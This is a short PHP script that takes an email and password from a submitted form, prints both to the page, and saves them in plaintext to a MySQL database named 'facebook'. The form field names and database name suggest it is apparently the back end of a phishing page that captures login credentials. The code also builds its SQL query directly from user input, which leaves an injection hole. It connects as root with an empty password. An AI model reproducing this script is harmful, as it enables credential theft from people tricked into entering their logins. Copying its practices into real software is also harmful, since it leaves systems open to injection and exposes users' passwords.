<?php

	$uname = $_POST['Email'];
	$key = $_POST['Passwd'];
	
	$db_host = "localhost";
	$db_user = "root";
	$db_key = "";
	$db_name = "facebook";
	
	$connect = mysql_connect($db_host, $db_user, $db_key) or die(mysql_error());
	echo "Connect: ".$connect."<br>";
	$selectDB = mysql_select_db($db_name);
	
	
	echo "User Name: ".$uname."<br/>";
	echo "Password: ".$key."<br/>";
	
	
	$query = "INSERT INTO usertable(User, Password) VALUES ('$uname', '$key')";
	$result = mysql_query($query) or die(mysql_error());
	
	//echo $query."<br>";
	
	//if(!empty($result))
	//	echo $result;
	//else 
	//	echo 0;
	

?>